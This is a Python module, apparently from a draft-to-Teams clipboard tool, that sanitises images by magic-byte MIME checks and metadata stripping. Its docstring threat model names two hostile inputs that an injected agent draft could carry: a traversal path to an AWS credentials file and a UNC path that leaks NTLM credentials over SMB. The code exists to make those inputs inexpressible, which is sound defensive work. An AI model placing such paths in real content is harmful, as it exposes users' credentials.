"""Validate and sanitise an image before it goes near the clipboard.

THE DESIGN CONSTRAINT, because it is not obvious from the code: this module never
opens a file. Bytes arrive from the caller -- either base64 that is already in the
draft, or bytes md2teams.py read at the invocation boundary. That is deliberate and
it is the whole security story.

File-selection authority sits on argv and nowhere else. md2teams.py reads the draft
path given on the command line and, since 2026-07-29, image files whose paths were
ALSO bound on the command line (`--image shot=C:\\work\\shot.png`). The draft refers
to one of those by NAME -- `<img src="name:shot">` -- and a name is looked up in a
dict built from argv; it is never joined onto a directory. A design where a path
*inside the draft* triggers a read would instead move that authority into
agent-authored content, and the draft's content is the least-trusted input in the
system: an agent routinely ingests pasted emails, fetched pages and ticket bodies
before writing one. Concretely, it would admit `![](../../.aws/credentials)`, and on
Windows `![](\\\\host\\share\\x.png)` is not a file read at all -- it is an outbound
SMB connection that offers this machine's NTLM credentials to whoever answers.

Because the draft grammar still contains no path syntax, none of that is *blocked*
here. It is unexpressible: traversal and UNC need characters a name may not contain,
and a name nobody bound on argv resolves to nothing whatsoever. An agent can also
skip the binding entirely and inline a data: URI it produced with its own Read tool,
which the host already gates and logs.

What remains after that, and what this module handles:

- MIME is taken from MAGIC BYTES, never from a declared type or a file extension.
  A declared type is an assertion by the least-trusted input.
- Metadata is removed by DECODE-AND-RE-EMIT, not by scanning for known-bad. The
  everyday hazard is not exotic: crop a screenshot to remove a colleague's name
  and many editors keep the *pre-crop* image in an EXIF thumbnail. Re-emitting
  only the chunks an image needs makes carrying that structurally impossible.
- Size is NOT capped. There was a 2 MB policy cap until 2026-07-30; the operator
  removed it, on the reasoning that it guarded nothing and that limits should be
  fitted to observed problems rather than guessed in advance. Teams was measured
  accepting 8.83 MB end to end, and that figure is a lower bound, not a ceiling.
  What replaced the cap is a stderr NOTE above the largest verified payload (see
  VERIFIED_IMAGE_BYTES) -- never a refusal. The note exists because the failure
  this cap could never see is the recipient's: base64 still inflates 4/3 and the
  payload still crosses the clipboard as one allocation, and a message that sends
  fine here can still arrive broken for someone else.

What this module CANNOT do, stated plainly so no one assumes otherwise: it cannot
tell you what the picture depicts. The operator reviews a filename and publishes
bytes. That gap is irreducible here.
"""

from __future__ import annotations

import base64
import binascii
import hashlib
import re
import struct
from dataclasses import dataclass

# The largest image payload ever carried end to end -- pasted, sent, and rendered --
# through real Teams: 8.83 MB (probe/14-image-size-format.mjs, 2026-07-30). This is a
# LOWER BOUND on what Teams accepts, not a ceiling and not a cap: nothing here refuses
# a byte count. It is the threshold for an advisory note, so that a draft venturing
# past the evidence says so. Raise it only when a larger payload has actually been
# observed arriving intact AT A RECIPIENT. The sending client cannot establish that:
# copying a sent message from the client that sent it can hand back that client's own
# blob: URL, which is a session-local object reference and proves no network transfer,
# no upload and no persistence. Confirm from a different client or session.
VERIFIED_IMAGE_BYTES = 8_830_000

_DATA_URI = re.compile(r"^data:([a-z]+/[a-z0-9.+-]+)?(;base64)?,(.*)$", re.I | re.S)

# The grammar of a `--image NAME=PATH` binding, enforced on BOTH sides -- argv and
# draft -- from this one definition. Deliberately narrower than any filesystem: no
# dot, no slash, no backslash, no colon, so `..`, `C:\...` and `\\host\share` are
# not names that get rejected, they are strings that cannot be names at all.
IMAGE_NAME = re.compile(r"^[A-Za-z0-9_-]{1,64}$")

# What a draft writes to reach a bound image. Not a URI scheme we invented for fun:
# it is syntactically incapable of carrying a path, which is the point.
NAME_PREFIX = "name:"

# Magic bytes -> mime. Only formats we can also strip metadata from appear here;
# anything else is refused rather than passed through unexamined.
_MAGIC: tuple[tuple[bytes, str], ...] = (
    (b"\x89PNG\r\n\x1a\n", "image/png"),
    (b"\xff\xd8\xff", "image/jpeg"),
)

# PNG chunks an image needs to render. Everything else -- tEXt, iTXt, zTXt, eXIf,
# XMP, time stamps -- is dropped.
_PNG_KEEP = {b"IHDR", b"PLTE", b"IDAT", b"IEND", b"tRNS", b"gAMA", b"cHRM", b"sRGB"}

_JPEG_SOF = {0xC0, 0xC1, 0xC2, 0xC3, 0xC5, 0xC6, 0xC7, 0xC9, 0xCA, 0xCB, 0xCD, 0xCE, 0xCF}


class ImageError(ValueError):
    """The image cannot be emitted. Message is shown to the drafting agent."""


@dataclass(frozen=True)
class ImageInfo:
    """What the copy path echoes, so an image can never be silently present."""

    mime: str
    width: int
    height: int
    original_bytes: int
    emitted_bytes: int
    sha256: str

    @property
    def stripped_bytes(self) -> int:
        return self.original_bytes - self.emitted_bytes

    def summary(self) -> str:
        stripped = f", stripped {self.stripped_bytes} bytes of metadata" if self.stripped_bytes else ""
        return (
            f"{self.mime} {self.width}x{self.height}, {self.emitted_bytes} bytes"
            f"{stripped}, sha256:{self.sha256[:12]}"
        )


def _sniff(data: bytes) -> str:
    for magic, mime in _MAGIC:
        if data.startswith(magic):
            return mime
    raise ImageError(
        "image data is not a PNG or a JPEG (checked by magic bytes, not by the declared "
        "type). Only formats this tool can strip metadata from are accepted -- convert to "
        "PNG or JPEG first."
    )


def _strip_png(data: bytes) -> bytes:
    out = bytearray(data[:8])
    pos = 8
    while pos + 8 <= len(data):
        (length,) = struct.unpack(">I", data[pos : pos + 4])
        ctype = data[pos + 4 : pos + 8]
        end = pos + 12 + length
        if end > len(data):
            raise ImageError("PNG is truncated: a chunk runs past the end of the data.")
        if ctype in _PNG_KEEP:
            out += data[pos:end]
        pos = end
        if ctype == b"IEND":
            break
    return bytes(out)


def _strip_jpeg(data: bytes) -> bytes:
    out = bytearray(data[:2])  # SOI
    pos = 2
    while pos + 4 <= len(data):
        if data[pos] != 0xFF:
            raise ImageError("JPEG is malformed: expected a segment marker.")
        marker = data[pos + 1]
        if marker == 0xDA:  # SOS -- entropy-coded data follows to EOI; copy verbatim
            out += data[pos:]
            break
        (seg_len,) = struct.unpack(">H", data[pos + 2 : pos + 4])
        end = pos + 2 + seg_len
        if end > len(data):
            raise ImageError("JPEG is truncated: a segment runs past the end of the data.")
        # Drop APP0-APP15 (EXIF, JFIF, XMP, ICC) and COM. Keep everything structural.
        if not (0xE0 <= marker <= 0xEF or marker == 0xFE):
            out += data[pos:end]
        pos = end
    return bytes(out)


def _png_size(data: bytes) -> tuple[int, int]:
    w, h = struct.unpack(">II", data[16:24])
    return w, h


def _jpeg_size(data: bytes) -> tuple[int, int]:
    pos = 2
    while pos + 4 <= len(data):
        if data[pos] != 0xFF:
            break
        marker = data[pos + 1]
        (seg_len,) = struct.unpack(">H", data[pos + 2 : pos + 4])
        if marker in _JPEG_SOF:
            h, w = struct.unpack(">HH", data[pos + 5 : pos + 9])
            return w, h
        if marker == 0xDA:
            break
        pos += 2 + seg_len
    raise ImageError("JPEG has no frame header, so its dimensions cannot be read.")


def sanitize_bytes(data: bytes, where: str) -> tuple[str, ImageInfo]:
    """Sanitise raw image bytes into a `data:` URI, plus what to echo about it.

    The single place the byte-level rules live -- size cap, magic-byte sniff,
    metadata strip, dimension read -- so a `data:` URI in the draft and a file
    bound with `--image` get identically strict treatment. The bytes are given to
    us; this function does not know or care where they came from.

    Raises ImageError, whose message is written for the agent that authored the
    draft -- it should say what to do, not merely what went wrong.
    """
    if not data:
        raise ImageError(f"{where}: the image payload is empty.")

    original_bytes = len(data)

    # The byte-level helpers below say what is wrong with the bytes; only the caller
    # knows WHICH image they came from. Prefixing here rather than threading `where`
    # through five signatures keeps every refusal locatable -- which matters more now
    # that a draft may carry several images from several --image bindings.
    try:
        mime = _sniff(data)
        cleaned = _strip_png(data) if mime == "image/png" else _strip_jpeg(data)
        width, height = _png_size(cleaned) if mime == "image/png" else _jpeg_size(cleaned)
    except ImageError as exc:
        raise ImageError(f"{where}: {exc}") from exc

    info = ImageInfo(
        mime=mime,
        width=width,
        height=height,
        original_bytes=original_bytes,
        emitted_bytes=len(cleaned),
        sha256=hashlib.sha256(cleaned).hexdigest(),
    )
    encoded = base64.b64encode(cleaned).decode("ascii")
    return f"data:{mime};base64,{encoded}", info


def sanitize_data_uri(src: str, where: str) -> tuple[str, ImageInfo]:
    """Return a cleaned `data:` URI plus what to echo about it.

    Handles only what is specific to the data: URI form -- the grammar, the base64
    decode, and the declared type. Everything byte-level is sanitize_bytes'.
    """
    m = _DATA_URI.match(src.strip())
    if m is None:
        if src.strip().lower().startswith(("http://", "https://")):
            raise ImageError(
                f"{where}: an <img> with an http(s) src makes Teams reject the ENTIRE paste "
                f'("Cannot paste this image. Try different source."), not just the image. '
                f"Read the image and inline it as a data: URI instead."
            )
        raise ImageError(
            f"{where}: <img src> must be a data: URI or a name: reference. Either "
            f"read the image with your own tools and inline it as "
            f'"data:image/png;base64,...", or have its path bound on the command line '
            f'(--image shot=C:\\path\\to.png) and write "name:shot". A path written '
            f"in the draft is never read."
        )

    if m.group(2) is None:
        raise ImageError(f"{where}: only base64 data: URIs are supported (add ';base64').")

    try:
        data = base64.b64decode(m.group(3), validate=True)
    except (binascii.Error, ValueError) as exc:
        # Type name only, never the raw exception text: this is the house rule for
        # any FOREIGN exception, and the one site that broke it. (The re-raise above
        # is exempt -- it forwards our own authored ImageError, not a third party's.)
        raise ImageError(
            f"{where}: the base64 payload is not decodable ({type(exc).__name__})."
        ) from exc

    uri, info = sanitize_bytes(data, where)

    # After sanitize_bytes, not before: the declared type is checked against the
    # mime the BYTES produced, which is the only reading of them we trust.
    declared = (m.group(1) or "").lower()
    if declared and declared != info.mime:
        raise ImageError(
            f"{where}: the data: URI declares {declared} but the bytes are {info.mime}. "
            f"Refusing rather than trusting the declaration."
        )

    return uri, info
